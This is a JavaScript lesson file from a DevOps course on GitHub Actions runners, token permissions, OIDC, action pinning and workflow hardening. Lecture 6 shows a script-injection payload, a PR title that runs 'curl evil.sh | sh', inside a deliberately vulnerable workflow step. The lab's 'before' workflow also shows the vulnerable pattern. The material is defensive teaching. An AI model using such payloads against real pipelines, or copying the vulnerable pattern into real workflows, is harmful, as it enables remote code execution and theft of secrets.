/* LearnSphere - DevOps & CI/CD, Section 06: GitHub Actions: Runners, Security & Administration.
   Lectures 0-9 are core; additional lectures (not written yet) follow. Needs devops-common.js. */
(function(){
const K=window.DO,L=window.LESSONS;

const arc=K.dg(700,230,[
[10,10,680,210,'Actions Runner Controller on Kubernetes',1],
[25,70,130,60,'GitHub|workflow queue',0],[200,70,150,60,'Listener and|controller',2],
[400,30,130,40,'Runner pod 1',0],[400,90,130,40,'Runner pod 2',0],[400,150,130,40,'Runner pod 3',0],
[570,70,100,60,'Pods deleted|after each job',0]],
[[155,100,200,100],[350,100,400,50],[350,100,400,110],[350,100,400,170],[530,110,570,100]]);

const oidc=K.dg(700,220,[
[10,10,680,200,'OIDC: no stored cloud key',1],
[25,70,130,70,'Workflow job|asks for ID token',0],[190,70,150,70,'GitHub OIDC|provider signs token',2],[380,70,140,70,'Cloud trusts the|token claims',0],[560,70,115,70,'Short-lived|credentials',0]],
[[155,105,190,105],[340,105,380,105],[520,105,560,105]]);

/* ---------- 0 ---------- */
L['devops:5:0']={blocks:[
{p:'**GitHub-hosted runners** are virtual machines that GitHub provisions for each job and destroys afterward. You choose a label such as `ubuntu-latest` and get a clean, fully managed environment.'},
{t:[['Label','Operating system','Notes'],
['`ubuntu-latest`, `ubuntu-24.04`','Linux','Most common and cheapest'],
['`windows-latest`','Windows Server','Higher per-minute multiplier'],
['`macos-latest`','macOS','Highest multiplier, needed for Apple builds'],
['Larger runners','Linux, Windows, macOS, ARM','More CPU and RAM, static IPs and private networking options (paid)']]},
{h:'What is on the image'},
{ul:['Common language runtimes, build tools, Docker, the GitHub CLI and cloud CLIs are preinstalled. The list is published for each image.','Use setup actions (`setup-node`, `setup-python`) to select exact versions rather than relying on the default.','`latest` labels move to newer operating system versions over time. Pin the version when you need stability.']},
{h:'Limits to know'},
{t:[['Limit','Remember'],
['Job time','A job times out after a maximum duration (6 hours for hosted runners); set `timeout-minutes` lower'],
['Concurrency','Number of simultaneous jobs depends on plan'],
['Ephemeral','No state survives. A fresh VM every job'],
['Network','Public internet, no access to your private network unless you use larger or self-hosted runners']]},
{note:'Limits and pricing change. Check the current GitHub documentation before planning capacity or cost.'}],
src:[['GitHub-hosted runners',K.GH+'concepts/runners/github-hosted-runners'],['Runner images','https://github.com/actions/runner-images']]};

/* ---------- 1 ---------- */
L['devops:5:1']={blocks:[
{p:'A **self-hosted runner** is a machine you run that connects out to GitHub and picks up jobs. Use it when you need private network access, special hardware, a custom toolchain or cost control at scale.'},
{flow:['Create a runner group and registration token in the organisation settings','Install the runner application on your machine or container','Register it with a name and labels','The runner polls GitHub over HTTPS for jobs','A workflow targets it with runs-on labels','The job runs and the runner reports results']},
{code:`# Target a self-hosted runner by labels
jobs:
  build:
    runs-on: [self-hosted, linux, x64, gpu]`},
{h:'Runner groups'},
{p:'In an organisation or enterprise, **runner groups** control which repositories and workflows may use which runners. This is how you keep production-connected runners away from public or unreviewed code.'},
{t:[['Practice','Reason'],
['Use **ephemeral** runners (one job, then removed)','A reused runner keeps files and credentials from the last job'],
['Never use self-hosted runners for public repositories','Anyone can open a pull request that runs code on your machine'],
['Run as a non-root, dedicated user, ideally in a container or VM','Limits what a malicious job can reach'],
['Keep the runner software updated','Old runners stop accepting jobs and miss security fixes']]},
{note:'Treat a self-hosted runner as a machine that executes whatever the repository\'s workflow tells it to. Isolate and rebuild it accordingly.'}],
src:[['Self-hosted runners',K.GH+'concepts/runners/self-hosted-runners'],['Managing runner groups',K.GHD+'actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups']]};

/* ---------- 2 ---------- */
L['devops:5:2']={blocks:[
{p:'**Actions Runner Controller (ARC)** runs GitHub Actions runners as pods in a Kubernetes cluster. Runners are created when jobs are queued and removed when they finish, so you get ephemeral, autoscaled capacity.'},
{svg:arc},
{t:[['Component','Role'],
['**Controller**','Installed in the cluster, manages scale sets'],
['**Runner scale set**','A named pool (the label in `runs-on`) with minimum and maximum runners'],
['**Listener**','Watches GitHub for queued jobs and asks the controller to create runners'],
['**Runner pod**','Registers, runs one job and exits']]},
{code:`# Install the controller and a scale set with Helm (outline)
helm install arc oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller \\
  -n arc-systems --create-namespace

helm install my-runners oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \\
  -n arc-runners --create-namespace \\
  --set githubConfigUrl=https://github.com/acme \\
  --set githubConfigSecret.github_token=<token> \\
  --set minRunners=0 --set maxRunners=20`},
{code:`# Workflow
runs-on: my-runners`},
{h:'Design points'},
{ul:['Set `minRunners: 0` to scale to zero when idle, trading a short startup delay for cost.','Container jobs and Docker builds inside pods need a deliberate choice (Docker-in-Docker or rootless builders), each with security trade-offs.','Authenticate the controller with a **GitHub App**, not a personal token.','Watch queue time. It tells you whether `maxRunners` is too low.']}],
src:[['Actions Runner Controller',K.GH+'concepts/runners/actions-runner-controller']]};

/* ---------- 3 ---------- */
L['devops:5:3']={blocks:[
{p:'Every workflow run gets a short-lived **`GITHUB_TOKEN`**. What it may do is set by `permissions`. The principle is **least privilege**: start from read-only and add only what each job needs.'},
{t:[['Permission','Allows'],
['`contents: read`','Read the repository (checkout)'],
['`contents: write`','Push commits and create releases'],
['`pull-requests: write`','Comment on or label pull requests'],
['`packages: write`','Publish to GitHub Packages and GHCR'],
['`id-token: write`','Request an OIDC token for cloud authentication'],
['`security-events: write`','Upload code scanning results']]},
{code:`# Workflow level default: read-only
permissions:
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:          # this job only
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - run: ./publish.sh`},
{h:'Set the default once'},
{p:'In organisation and repository settings, set the **default workflow permissions to read-only**. Workflows then must opt in to anything more, and a compromised step cannot silently write to the repository.'},
{note:'When you set `permissions` on a job, every permission you do not list becomes `none`. List exactly what the job needs.'}],
src:[['GITHUB_TOKEN',K.GH+'security-for-github-actions/security-guides/automatic-token-authentication'],['Permissions syntax',K.GH+'writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token']]};

/* ---------- 4 ---------- */
L['devops:5:4']={blocks:[
{p:'**OpenID Connect (OIDC)** lets a workflow prove **who it is** to a cloud provider and receive **temporary credentials**, so no long-lived cloud key has to be stored as a secret.'},
{svg:oidc},
{flow:['The job requests an ID token (needs id-token: write)','GitHub signs a token containing claims: repository, branch, environment, workflow','The job presents the token to the cloud provider','The cloud checks the signature and the trust conditions you configured','It returns short-lived credentials valid for minutes']},
{h:'Restrict the trust'},
{p:'The cloud side must check the **claims**, otherwise any repository could assume the role. The key claim is `sub` (subject).'},
{t:[['Condition on `sub`','Meaning'],
['`repo:acme/app:ref:refs/heads/main`','Only the main branch of one repository'],
['`repo:acme/app:environment:production`','Only jobs targeting the production environment'],
['`repo:acme/*`','Any repository in the organisation (broad, avoid for production)']]},
{code:`permissions:
  id-token: write
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
      aws-region: eu-west-1`},
{note:'Similar actions exist for Azure (`azure/login`) and Google Cloud (`google-github-actions/auth`). Section 15 covers all three in detail.'}],
src:[['OpenID Connect',K.GH+'security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect']]};

/* ---------- 5 ---------- */
L['devops:5:5']={blocks:[
{p:'A version **tag** such as `v4` is a pointer that its owner can move. If an action\'s repository is compromised, an attacker can repoint the tag at malicious code and every workflow using it runs that code.'},
{t:[['Reference','Mutable?','Risk'],
['`actions/checkout@main`','Yes, changes on every commit','Highest'],
['`actions/checkout@v4`','Yes, tag can move','Moderate'],
['`actions/checkout@<40-char SHA>`','No','Lowest']]},
{code:`# Pin to a full commit SHA and note the version in a comment
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2`},
{h:'Practices'},
{ul:['Pin **third-party** actions to a full SHA. Verified GitHub-owned actions are lower risk but can be pinned too.','Let **Dependabot** (or Renovate) propose updates to pinned SHAs as pull requests, so pinning does not freeze you on old versions.','Prefer actions whose releases are **immutable**. Immutable releases cannot be altered or deleted after publication, and their tags are protected.','Use organisation policy to require SHA pinning where available.']},
{note:'Pinning controls the action\'s own code but not what that action downloads at run time. Prefer actions that bundle their code, and review what they fetch.'}],
src:[['Security hardening for Actions',K.GH+'security-for-github-actions/security-guides/security-hardening-for-github-actions'],['Immutable releases',K.GHD+'code-security/supply-chain-security/understanding-your-software-supply-chain/immutable-releases']]};

/* ---------- 6 ---------- */
L['devops:5:6']={blocks:[
{p:'Two problems account for many Actions compromises: **script injection** from untrusted text, and running **untrusted pull request code** with privileged access.'},
{h:'Script injection'},
{p:'An expression inside `run:` is replaced with its value **before** the shell starts, so a crafted value becomes shell code.'},
{code:`# VULNERABLE: a PR titled  a"; curl evil.sh | sh; echo "  runs the attacker's command
- run: echo "Title is \${{ github.event.pull_request.title }}"

# SAFE: pass through an environment variable; the shell treats it as data
- run: echo "Title is $TITLE"
  env:
    TITLE: \${{ github.event.pull_request.title }}`},
{t:[['Untrusted inputs','Examples'],
['Titles, bodies, comments','`github.event.issue.title`, `...pull_request.body`, `...comment.body`'],
['Branch and ref names','`github.head_ref`'],
['Commit messages and author names','`github.event.head_commit.message`']]},
{h:'`pull_request` vs `pull_request_target`'},
{t:[['Trigger','Runs','Token and secrets','Use'],
['`pull_request`','The PR merge commit, from the fork','Read-only token, no secrets for forks','Safe default for CI'],
['`pull_request_target`','The workflow from the **base** branch','Write token and secrets available','Only for trusted automation like labelling. **Never check out and run PR code here**']]},
{note:'The dangerous pattern is `pull_request_target` combined with checking out the pull request\'s code and running it. That gives untrusted code your secrets and a write token.'},
{h:'More defences'},
{ul:['Use a repository policy requiring approval before workflows from outside contributors run.','Keep `permissions` minimal so an injection can do little.','Prefer an action (`uses:`) over inline shell for logic that handles untrusted text.','Scan workflows with a tool such as `zizmor` or the GitHub code scanning for Actions.']}],
src:[['Script injections',K.GH+'security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections']]};

/* ---------- 7 ---------- */
L['devops:5:7']={blocks:[
{p:'In an organisation you want standards enforced centrally, not repository by repository. GitHub offers several policy controls.'},
{t:[['Control','What it does'],
['**Allowed actions and reusable workflows**','Allow only GitHub-authored, verified creators or an explicit list (can require SHA pinning)'],
['**Default workflow permissions**','Make `GITHUB_TOKEN` read-only by default'],
['**Fork pull request approval**','Require approval before running workflows from outside collaborators'],
['**Runner groups**','Decide who may use which runners'],
['**Rulesets with required workflows**','Run an organisation-owned workflow on selected repositories and make passing it a merge requirement'],
['**Artifact and log retention**','Set how long run data is kept']]},
{flow:['Define the standard pipeline checks centrally','Publish them as a reusable workflow in a shared repository','Add a ruleset that requires the workflow on selected repositories','Repositories get the checks without copying anything','Update once, and every repository follows']},
{h:'Governance trade-offs'},
{ul:['Stricter policy reduces risk but adds friction. Provide a quick request path for new actions.','Review the allow list on a schedule and remove unused entries.','Document the exceptions and who approved them.']}],
src:[['Managing GitHub Actions settings for an organization',K.GHD+'organizations/managing-organization-settings/disabling-or-limiting-github-actions-for-your-organization']]};

/* ---------- 8 ---------- */
L['devops:5:8']={blocks:[
{p:'GitHub-hosted runner time is metered. Understanding what is free, what is billed and how to cap spending avoids surprises.'},
{t:[['Topic','Notes'],
['Public repositories','Standard hosted runners are free for public repositories'],
['Private repositories','Each plan includes a quota of minutes; extra usage is billed per minute by runner type'],
['OS multipliers','Windows and macOS minutes cost more than Linux minutes'],
['Larger runners','Billed per minute at their own rate'],
['Storage','Artifacts and caches count toward storage limits']]},
{note:'GitHub has changed Actions pricing and plans more than once, including how self-hosted runners and larger runners are charged. Always read the current billing page rather than relying on figures from a course.'},
{h:'Controls'},
{ul:['Set a **budget** and spending limit in billing settings, with email alerts.','Use the **usage report** to see minutes by repository, workflow and runner type.','Reduce waste: cancel redundant runs, add `timeout-minutes`, use path filters, cache dependencies, avoid scheduled workflows nobody reads.','Choose the cheapest runner that meets the need (Linux over macOS unless required).']},
{code:`jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15     # a stuck job stops billing`}],
src:[['Actions billing',K.GHD+'billing/managing-billing-for-your-products/managing-billing-for-github-actions']]};

/* ---------- 9 ---------- */
L['devops:5:9']={blocks:[
{p:'Take an ordinary workflow and harden it, then add an ephemeral self-hosted runner.'},
{flow:['Set repository default token permissions to read-only','Add explicit permissions to the workflow','Pin third-party actions to SHAs','Move untrusted expressions into env variables','Require approval for outside contributors','Register an ephemeral runner and route one job to it']},
{h:'Before and after'},
{code:`# BEFORE
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/build-action@v1
      - run: echo "\${{ github.event.pull_request.title }}"`},
{code:`# AFTER
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: some-org/build-action@3f2a9c8d0e1b7a6c5d4e3f2a1b0c9d8e7f6a5b4c  # v1.4.0
      - run: echo "$TITLE"
        env:
          TITLE: \${{ github.event.pull_request.title }}`},
{h:'Register an ephemeral runner'},
{code:`./config.sh --url https://github.com/<org>/<repo> --token <registration-token> \\
  --ephemeral --labels lab,linux --unattended
./run.sh        # takes one job, then exits`},
{h:'Verify'},
{ul:['Does the workflow still pass with only `contents: read`?','Does a malicious PR title now print as plain text?','After the job, is the runner gone from the runner list?']}]};
})();
